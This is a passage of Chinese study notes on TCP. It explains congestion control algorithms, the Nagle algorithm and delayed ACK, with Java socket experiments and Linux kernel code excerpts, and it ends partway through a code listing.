<p>拥塞控制是从整个网络的大局观来思考的，如果没有拥塞控制，某一时刻网络的时延增加、丢包频繁，发送端疯狂重传，会造成网络更重的负担，而更重的负担会造成更多的时延和丢包，形成雪崩的网络风暴。</p>
<p>这个算法的过程如下：</p>
<p>●第一步，三次握手以后，双方通过 ACK 告诉了对方自己的接收窗口（rwnd）的大小，之后就可以互相发数据了</p>
<p>●第二步，通信双方各自初始化自己的「拥塞窗口」（Congestion Window，cwnd）大小。</p>
<p>●第三步，cwnd 初始值较小时，<code>每收到一个 ACK</code>，<code>cwnd + 1</code>，每经过一个 <code>RTT</code>，cwnd 变为之前的两倍。 过程如下图 </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/153.jpg"></p>
<p>在初始拥塞窗口为 10 的情况下，拥塞窗口随时间的变化关系如下图</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/154.jpg"></p>
<p>因此可以得到拥塞窗口达到 N 所花费的时间公式为：</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/155.jpg"></p>
<p>假设 <code>RTT</code> 为 50ms，客户端和服务端的接收窗口为65535字节（64KB），初始拥塞窗口为：10段，那么要达到 64KB 的吞吐量，拥塞窗口的段数 = 65535 / 1460 = 45 段，需要的 RTT 次数 = log2（45 / 10）= 2.12 次，需要的时间 = 50 * 2.12 = 106ms。也就是客户端和服务器之间的 64KB 的吞吐量，需要 2.12 次 RTT，100ms 左右的延迟。</p>
<p>早期的 Linux 的初始 cwnd 为 4，在这种情况下，需要 3.35 次 RTT，花费的实际就更长了。如果客户端和服务器之间的 RTT 很小，则这个时间基本可以忽略不计</p>
<h3 id="使用-packetdrill-来演示慢启动的过程"><a href="#使用-packetdrill-来演示慢启动的过程" class="headerlink" title="使用 packetdrill 来演示慢启动的过程"></a>使用 packetdrill 来演示慢启动的过程</h3><h3 id="慢启动阈值（Slow-Start-Threshold，ssthresh）"><a href="#慢启动阈值（Slow-Start-Threshold，ssthresh）" class="headerlink" title="慢启动阈值（Slow Start Threshold，ssthresh）"></a>慢启动阈值（Slow Start Threshold，ssthresh）</h3><p>慢启动拥塞窗口（cwnd）肯定不能无止境的指数级增长下去，否则拥塞控制就变成了「拥塞失控」了，它的阈值称为<code>「慢启动阈值」</code>（Slow Start Threshold，ssthresh），这是文章开头介绍的拥塞控制的第二个核心状态值。ssthresh 就是一道刹车，让拥塞窗口别涨那么快。</p>
<p>1.当 cwnd &lt; ssthresh 时，拥塞窗口按指数级增长（慢启动）</p>
<p>2.当 cwnd &gt; ssthresh 时，拥塞窗口按线性增长（拥塞避免）</p>
<h3 id="拥塞避免（Congestion-Avoidance）"><a href="#拥塞避免（Congestion-Avoidance）" class="headerlink" title="拥塞避免（Congestion Avoidance）"></a>拥塞避免（Congestion Avoidance）</h3><p>当 cwnd &gt; ssthresh 时，拥塞窗口进入「拥塞避免」阶段，在这个阶段，每一个往返 RTT，拥塞窗口大约增加 1 个 <code>MSS </code>大小，直到检测到拥塞为止。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/156.jpg"></p>
<p>与慢启动的区别在于</p>
<p>●慢启动的做法是 RTT 时间内每收到一个 ACK，拥塞窗口 cwnd 就加 1，也就是每经过 1 个 RTT，cwnd 翻倍</p>
<p>●拥塞避免的做法保守的多，每经过一个RTT 才将拥塞窗口加 1，不管期间收到多少个 ACK</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/157.jpg"></p>
<p>实际的算法是如下：，</p>
<pre><code>每收到一个 ACK，将拥塞窗口增加一点点（1 / cwnd）：cwnd += 1 / cwnd</code></pre>
<p>以初始 cwnd = 1 为例，cwnd 变化的过程如下图</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/158.jpg"></p>
<p>所以是每经过 1 个 RTT，拥塞窗口「大约」增加 1</p>
<hr>
<p>前面介绍的慢启动和拥塞避免是 1988 年提出的拥塞控制方案，在 1990 年又出现了两种新的拥塞控制方案：「快速重传」和「快速恢复」</p>
<h3 id="算法三：快速重传（Fast-Retransmit"><a href="#算法三：快速重传（Fast-Retransmit" class="headerlink" title="算法三：快速重传（Fast Retransmit)"></a>算法三：快速重传（Fast Retransmit)</h3><p>之前重传的文章中我们介绍重传的时间间隔，要等几百毫秒才会进行第一次重传。聪明的网络协议设计者们想到了一种方法：<code>「快速重传」</code></p>
<p>快速重传的含义是：当接收端收到一个不按序到达的数据段时，TCP 立刻发送 1 个重复 ACK，而不用等有数据捎带确认，当发送端收到 3 个或以上重复 ACK，就意识到之前发的包可能丢了，于是马上进行重传，不用傻傻的等到重传定时器超时再重传。</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/159.jpg"></p>
<h3 id="选择确认（Selective-Acknowledgment，SACK）"><a href="#选择确认（Selective-Acknowledgment，SACK）" class="headerlink" title="选择确认（Selective Acknowledgment，SACK）"></a>选择确认（Selective Acknowledgment，SACK）</h3><h3 id="使用-packetdrill-演示快速重传-1"><a href="#使用-packetdrill-演示快速重传-1" class="headerlink" title="使用 packetdrill 演示快速重传"></a>使用 packetdrill 演示快速重传</h3><h3 id="算法四：快速恢复"><a href="#算法四：快速恢复" class="headerlink" title="算法四：快速恢复"></a>算法四：快速恢复</h3><p>当收到三次重复 ACK 时，进入快速恢复阶段。解释为网络轻度拥塞。</p>
<p>1.拥塞阈值 ssthresh 降低为 cwnd 的一半：ssthresh = cwnd / 2</p>
<p>2.拥塞窗口 cwnd 设置为 ssthresh</p>
<p>3.拥塞窗口线性增加</p>
<h3 id="慢启动、快速恢复中的快慢是什么意思"><a href="#慢启动、快速恢复中的快慢是什么意思" class="headerlink" title="慢启动、快速恢复中的快慢是什么意思"></a>慢启动、快速恢复中的快慢是什么意思</h3><p>刚开始学习这部内容的时候，有一个疑惑，明明慢启动拥塞窗口是成指数级增长，那还叫慢？快速恢复拥塞窗口增长的这么慢，还叫快速恢复？</p>
<p>我的理解是慢和快不是指的拥塞窗口增长的速度，而是<code>指它们的初始值</code>。慢启动初始值一般都很小，快速恢复的 cwnd 设置为 ssthresh</p>
<h3 id="演示丢包"><a href="#演示丢包" class="headerlink" title="演示丢包"></a>演示丢包</h3><p>拥塞避免是一个很复杂的话题，有很多种算法：TCP Reno、TCP new Reno、TCP Vegas、TCP CUBIC等，这里不做太多的展开。</p>
<h3 id="为什么初始化拥塞窗口-initcwnd-是-10"><a href="#为什么初始化拥塞窗口-initcwnd-是-10" class="headerlink" title="为什么初始化拥塞窗口 initcwnd 是 10"></a>为什么初始化拥塞窗口 initcwnd 是 10</h3><p>最初的 TCP 初始拥塞窗口值为 3 或者 4，大于 4KB 左右，如今常见的 web 服务数据流都较短，比如一个页面只有 4k ~ 6k，在慢启动阶段，还没达到传输峰值，整个数据流就可能已经结束了。对于大文件传输，慢启动没有什么问题，慢启动造成的时延会被均摊到漫长的传输过程中。</p>
<p>根据 Google 的研究，90% 的 HTTP 请求数据都在 <code>16KB</code> 以内，约为 10 个 TCP 段。再大比如 16，在某些地区会出现明显的丢包，因此 10 是一个比较合理的值。</p>
<h3 id="小结-14"><a href="#小结-14" class="headerlink" title="小结"></a>小结</h3><p>这篇文章主要以实际的案例讲解了拥塞控制的几种算法：</p>
<pre><code>慢启动：拥塞窗口一开始是一个很小的值，然后每 RTT 时间翻倍
拥塞避免：当拥塞窗口达到拥塞阈值（ssthresh）时，拥塞窗口从指数增长变为线性增长
快速重传：发送端接收到 3 个重复 ACK 时立即进行重传
快速恢复：当收到三次重复 ACK 时，进入快速恢复阶段，此时拥塞阈值降为之前的一半，然后进入线性增长阶段</code></pre>
<h3 id="做一道练习题"><a href="#做一道练习题" class="headerlink" title="做一道练习题"></a>做一道练习题</h3><p>设 TCP 的 ssthresh （慢开始门限）的初始值为 8 （单位为报文段）。当拥塞窗口上升到 12 时网络发生了超时，TCP 使用慢开始和拥塞避免。试分别求出第 1 次到第 15 次传输的各拥塞窗口大小，备注：拥塞算法使用 tahoe，初始窗口为 1。</p>
<p>PS:文中并没有提到的一点：当拥塞发生时（超时或收到重复确认） ，ssthresh 被设置为当前窗口大小的一半（ cwnd 和接收方通告窗口大小的最小值，但最少为 2个报文段） 。此外，如果是超时引起了拥塞，则 cwnd 被设置为1个报文段（这就是慢启动） 。</p>
<h2 id="26-TCP-发包的-hold-住哥-——-Nagle-算法那些事"><a href="#26-TCP-发包的-hold-住哥-——-Nagle-算法那些事" class="headerlink" title="26 TCP 发包的 hold 住哥 —— Nagle 算法那些事"></a>26 TCP 发包的 hold 住哥 —— Nagle 算法那些事</h2><p>从这篇文章开始，我们来讲大名鼎鼎的 Nagle 算法。同样以一个小测验来开始。</p>
<p>关于下面这段代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Socket socket &#x3D; new Socket();</span><br><span class="line">socket.connect(new InetSocketAddress(&quot;localhost&quot;, 9999));</span><br><span class="line">OutputStream output &#x3D; socket.getOutputStream();</span><br><span class="line">byte[] request &#x3D; new byte[10];</span><br><span class="line">for (int i &#x3D; 0; i &lt; 5; i++) &#123;</span><br><span class="line">    output.write(request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>说法正确的是：</p>
<pre><code>A. TCP 把 5 个包合并，一次发送 50 个字节
B. TCP 分 5 次发送，一次发送 10 个字节
C. 以上都不对</code></pre>
<p>来做一下实验，客户端代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class NagleClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Socket socket &#x3D; new Socket();</span><br><span class="line">        SocketAddress address &#x3D; new InetSocketAddress(&quot;c1&quot;, 9999);</span><br><span class="line">        socket.connect(address);</span><br><span class="line">        OutputStream output &#x3D; socket.getOutputStream();</span><br><span class="line">        byte[] request &#x3D; new byte[10];</span><br><span class="line">        &#x2F;&#x2F; 分 5 次发送 5 个小包</span><br><span class="line">        for (int i &#x3D; 0; i &lt; 5; i++) &#123;</span><br><span class="line">            output.write(request);</span><br><span class="line">        &#125;</span><br><span class="line">        TimeUnit.SECONDS.sleep(1);</span><br><span class="line">        socket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>服务端代码比较简单，可以直接用 nc -l 9999 启动一个 tcp 服务器 运行上面的 NagleClient，抓包如下</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/160.jpg"></p>
<p>可以看到除了第一个包是单独发送，后面的四个包合并到了一起，所以文章开头的答案是 C</p>
<p>那为什么是这样的呢？这就是我们今天要讲的重点 Nagle 算法。</p>
<h3 id="nagle-算法"><a href="#nagle-算法" class="headerlink" title="nagle 算法"></a>nagle 算法</h3><p>简单来讲 nagle 算法讲的是<code>减少发送端频繁的发送小包给对方</code>。</p>
<p>Nagle 算法要求，当一个 TCP 连接中有在传数据（已经发出但还未确认的数据）时，小于 MSS 的报文段就不能被发送，直到所有的在传数据都收到了 ACK。同时收到 ACK 后，TCP 还不会马上就发送数据，会收集小包合并一起发送。网上有人想象的把 <code>Nagle 算法</code>说成是「hold 住哥」，我觉得特别形象。</p>
<p>算法思路如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if there is new data to send</span><br><span class="line">  if the window size &gt;&#x3D; MSS and available data is &gt;&#x3D; MSS</span><br><span class="line">    send complete MSS segment now</span><br><span class="line">  else</span><br><span class="line">    if there is unconfirmed data still in the pipe</span><br><span class="line">      enqueue data in the buffer until an acknowledge is received</span><br><span class="line">    else</span><br><span class="line">      send data immediately</span><br><span class="line">    end if</span><br><span class="line">  end if</span><br><span class="line">end if</span><br></pre></td></tr></table></figure>
<p>默认情况下 Nagle 算法都是启用的，Java 可以通过 <code>setTcpNoDelay(true);</code>来禁用 Nagle 算法。</p>
<p>还是上面的代码，修改代码开启 <code>TCP_NODELAY </code>禁用 Nagle 算法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">省略...</span><br><span class="line">Socket socket &#x3D; new Socket();</span><br><span class="line">socket.setTcpNoDelay(true);</span><br><span class="line">省略...</span><br></pre></td></tr></table></figure>
<p>再次抓包 </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/161.jpg"></p>
<p>可以看到几乎同一瞬间分 5 次把数据发送了出去，不管之前发出去的包有没有收到 ACK。 Nagle 算法开启前后对比如下图所示 </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/162.jpg"></p>
<h3 id="用-packetdrill-来演示-Nagle-算法"><a href="#用-packetdrill-来演示-Nagle-算法" class="headerlink" title="用 packetdrill 来演示 Nagle 算法"></a>用 packetdrill 来演示 Nagle 算法</h3><h3 id="一个典型的小包场景：SSH"><a href="#一个典型的小包场景：SSH" class="headerlink" title="一个典型的小包场景：SSH"></a>一个典型的小包场景：SSH</h3><p>一个典型的大量小包传输的场景是用 ssh 登录另外一台服务器，每输入一个字符，服务端也随即进行回应，客户端收到了以后才会把输入的字符和响应的内容显示在自己这边。比如登录服务器后输入<code>ls</code>然后换行，中间包交互的过程如下图</p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/163.jpg"></p>
<p>1.客户端输入<code>l</code>，字符 <code>l</code> 被加密后传输给服务器</p>
<p>2.服务器收到<code>l</code>包，回复被加密的 <code>l</code> 及 ACK</p>
<p>3.客户端输入<code>s</code>，字符 <code>s</code> 被加密后传输给服务器</p>
<p>4.服务器收到<code>s</code>包，回复被加密的 <code>s</code> 及 ACK</p>
<p>5.客户端输入 enter 换行符，换行符被加密后传输给服务器</p>
<p>6.服务器收到换行符，回复被加密的换行符及 ACK</p>
<p>7.服务端返回执行 ls 的结果</p>
<p>8.客户端回复 ACK</p>
<h3 id="Nagle-算法的意义在哪里"><a href="#Nagle-算法的意义在哪里" class="headerlink" title="Nagle 算法的意义在哪里"></a>Nagle 算法的意义在哪里</h3><p>Nagle 算法的作用是减少小包在客户端和服务端直接传输，一个包的 TCP 头和 IP 头加起来至少都有 40 个字节，如果携带的数据比较小的话，那就非常<code>浪费</code>了。就好比开着一辆大货车运一箱苹果一样。 </p>
<p><img src="/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/164.jpg"></p>
<p>Nagle 算法在<code>通信时延较低的场景下意义不大</code>。在 Nagle 算法中 ACK 返回越快，下次数据传输就越早。</p>
<p>假设 RTT 为 10ms 且没有延迟确认（这个后面会讲到），那么你敲击键盘的间隔大于 10ms 的话就不会触发 Nagle 的条件：只有接收到所有的在传数据的 ACK 后才能继续发数据，也即如果所有的发出去的包 ACK 都收到了，就不用等了。如果你想触发 Nagle 的停等（stop-wait）机制，1s 内要输入超过 100 个字符。因此如果在局域网内，Nagle 算法基本上没有什么效果。</p>
<p>如果客户端到服务器的 RTT 较大，比如多达 200ms，这个时候你只要1s 内输入超过 5 个字符，就有可能触发 Nagle 算法了。</p>
<p><code>Nagle 算法是时代的产物</code>：Nagle 算法出现的时候网络带宽都很小，当有大量小包传输时，很容易将带宽占满，出现丢包重传等现象。因此对 ssh 这种交互式的应用场景，选择开启 Nagle 算法可以使得不再那么频繁的发送小包，而是合并到一起，代价是稍微有一些延迟。现在的 ssh 客户端已经默认关闭了 Nagle 算法。</p>
<h3 id="小结-15"><a href="#小结-15" class="headerlink" title="小结"></a>小结</h3><p>这篇文章主要介绍了非常经典的 Nagle 算法，这个算法可以有效的减少网络上小包的数量。Nagle 算法是应用在发送端的，简而言之就是，对发送端而言：</p>
<p>1.当第一次发送数据时不用等待，就算是 1byte 的小包也立即发送</p>
<p>2.后面发送数据时需要累积数据包直到满足下面的条件之一才会继续发送数据：</p>
<pre><code>●数据包达到最大段大小MSS
●接收端收到之前数据包的确认 ACK</code></pre>
<p>不过 Nagle 算法是时代的产物，可能会导致较多的性能问题，尤其是与我们下一篇文章要介绍的延迟确认一起使用的时候。很多组件为了高性能都默认禁用掉了这个特性。</p>
<h2 id="27-TCP-回包的磨叽姐-——-延迟确认那些事"><a href="#27-TCP-回包的磨叽姐-——-延迟确认那些事" class="headerlink" title="27 TCP 回包的磨叽姐 —— 延迟确认那些事"></a>27 TCP 回包的磨叽姐 —— 延迟确认那些事</h2><p>这篇文章我们来介绍延迟确认。</p>
<p>首先必须明确两个观点：</p>
<p>1.不是每个数据包都对应一个 <code>ACK</code> 包，因为可以合并确认。</p>
<p>2.也不是接收端收到数据以后必须立刻马上回复确认包。</p>
<p>如果收到一个数据包以后暂时没有数据要分给对端，它可以等一段时间（Linux 上是 40ms）再确认。如果这段时间刚好有数据要传给对端，ACK 就可以随着数据一起发出去了。如果超过时间还没有数据要发送，也发送 ACK，以免对端以为丢包了。这种方式成为<code>「延迟确认」</code>。</p>
<p>这个原因跟 <code>Nagle</code> 算法其实一样，回复一个空的 ACK 太浪费了。</p>
<p>1.如果接收端这个时候<code>恰好</code>有数据要回复客户端，那么 ACK 搭上顺风车一块发送。</p>
<p>2.`如果期间又有客户端的数据传过来，那可以把多次 ACK <code>合并</code>成一个立刻发送出去</p>
<p>3.如果一段时间没有顺风车，那么没办法，不能让接收端等太久，一个<code>空包</code>也得发。</p>
<p>这种机制被称为<code>延迟确认</code>（delayed ack），思破哥的文章把延迟确认（delayed-ack）称为<code>「磨叽姐」</code>，挺形象的。TCP 要求 ACK 延迟的时延必须小于<code>500ms</code>，一般操作系统实现都不会超过<code>200ms</code>。</p>
<p>延迟确认在很多 linux 机器上是没有办法关闭的，</p>
<p>那么这里涉及的就是一个非常根本的问题：「收到数据包以后什么时候该回复 ACK」</p>
<h3 id="什么时候需要回复-ACK"><a href="#什么时候需要回复-ACK" class="headerlink" title="什么时候需要回复 ACK"></a>什么时候需要回复 ACK</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">static void __tcp_ack_snd_check(struct sock *sk, int ofo_possible)</span><br><span class="line">&#123;</span><br><span class="line">	struct tcp_sock *tp &#x3D; tcp_sk(sk);</span><br><span class="line"></span><br><span class="line">	    &#x2F;* More than one full frame received... *&#x2F;</span><br><span class="line">	if (((tp-&gt;rcv_nxt - tp-&gt;rcv_wup) &gt; tp-&gt;ack.rcv_mss</span><br><span class="line">	     &#x2F;* ... and right edge of window advances far enough.</span><br><span class="line">	      * (tcp_recvmsg() will send ACK otherwise). Or...</span><br><span class="line">	      *&#x2F;</span><br><span class="line">	     &amp;&amp; __tcp_select_window(sk) &gt;&#x3D; tp-&gt;rcv_wnd) ||</span><br><span class="line">	    &#x2F;* We ACK each frame or... *&#x2F;</span><br><span class="line">	    tcp_in_quickack_mode(tp) ||</span><br><span class="line">	    &#x2F;* We have out of order data. *&#x2F;</span><br><span class="line">	    (ofo_possible &amp;&amp;</span><br><span class="line">	     skb_peek(&amp;tp-&gt;out_of_order_queue))) &#123;</span><br><span class="line">		&#x2F;* Then ack it now *&#x2F;</span><br><span class="line">		tcp_send_ack(sk);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		&#x2F;* Else, send delayed ack. *&#x2F;</span><br><span class="line">		tcp_send_delayed_ack(sk);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到需要立马回复 ACK 的场景有：</p>
<p>1.如果接收到了大于一个frame 的报文，且需要调整窗口大小</p>
<p>2.处于 quickack 模式（tcp_in_quickack_mode）</p>
<p>3.收到乱序包（We have out of order data.）</p>
<p>其它情况一律使用延迟确认的方式</p>
<p>需要重点关注的是：tcp_in_quickack_mode()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Send ACKs quickly, if &quot;quick&quot; count is not exhausted</span><br><span class="line"> * and the session is not interactive.</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">static __inline__ int tcp_in_quickack_mode(struct tcp_sock *tp)</span><br><span class="line">&#123;</span><br><span class="line">	return (tp-&gt;ack.quick &amp;&amp; !tp-&gt;ack.pingpong);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Delayed ACK control data *&#x2F;</span><br><span class="line">struct &#123;</span><br><span class="line">	__u8	pending;	&#x2F;* ACK is pending *&#x2F;</span><br><span class="line">	__u8	quick;		&#x2F;* Scheduled number of quick acks	*&#x2F;</span><br><span class="line">	__u8	pingpong;	&#x2F;* The session is interactive		*&#x2F;</span><br><span class="line">	__u8	blocked;	&#x2F;* Delayed ACK was blocked by socket lock*&#x2F;</span><br><span class="line">	__u32	ato;		&#x2F;* Predicted tick of soft clock		*&#x2F;</span><br><span class="line">	unsigned long timeout;	&#x2F;* Currently scheduled timeout		*&#x2F;</span><br><span class="line">	__u32	lrcvtime;	&#x2F;* timestamp of last received data packet*&#x2F;</span><br><span class="line">	__u16	last_seg_size;	&#x2F;* Size of last incoming segment	*&#x2F;</span><br><span class="line">	__u16	rcv_mss;	&#x2F;* MSS used for delayed ACK decisions	*&#x2F; </span><br><span class="line">&#125; ack;</span><br></pre></td></tr></table></figure>
<p>内核 tcp_sock 结构体中有一个 ack 子结构体，内部有一个 quick 和 pingpong 两个字段，其中pingpong 就是判断交互连接的，只有处于非交互 TCP 连接才有可能即进入<code>quickack</code>模式。</p>
<p>什么是交互式和 pingpong 呢？</p>
<p>顾名思义，其实有来有回的双向数据传输就叫 <code>pingpong</code>，对于通信的某一端来说，<code>R-W-R-W-R-W...</code>（R 表示读，W 表示写）</p>
<p>延迟确认出现的最多的场景是 <code>W-W-R</code>（写写读），我们来分析一下这种场景。</p>
<h3 id="延迟确认实际例子演示"><a href="#延迟确认实际例子演示" class="headerlink" title="延迟确认实际例子演示"></a>延迟确认实际例子演示</h3><p>可以用一段 java 代码演示延迟确认。</p>
<p>服务端代码如下，当从服务端 readLine 有返回非空字符串（读到\n 或 \r）就把字符串原样返回给客户端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class DelayAckServer &#123;</span><br><span class="line">    private static final int PORT &#x3D; 8888;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        ServerSocket serverSocket &#x3D; new ServerSocket();</span><br><span class="line">        serverSocket.bind(new InetSocketAddress(PORT));</span><br><span class="line">        System.out.println(&quot;Server startup at &quot; + PORT);</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            Socket socket &#x3D; serverSocket.accept();</span><br><span class="line">            InputStream inputStream &#x3D; socket.getInputStream();</span><br><span class="line">            OutputStream outputStream &#x3D; socket.getOutputStream();</span><br><span class="line">            int i &#x3D; 1;</span><br><span class="line">            while (true) &#123;</span><br><span class="line">                BufferedReader reader &#x3D; new BufferedReader(new InputStreamReader(inputStream));</span><br><span class="line">                String line &#x3D; reader.readLine();</span><br><span class="line">                if (line &#x3D;&#x3D; null) break;</span><br><span class="line">                System.out.println((i++) + &quot; : &quot; + line);</span><br><span class="line">                outputStream.write((line + &quot;\n&quot;).getBytes());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是客户端代码，客户端分两次调用 <code>write</code> 方法，模拟 <code>http</code> 请求的 <code>header</code> 和 <code>body</code>。第二次 <code>write</code> 包含了换行符（\n)，然后测量 write、write、read 所花费的时间。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 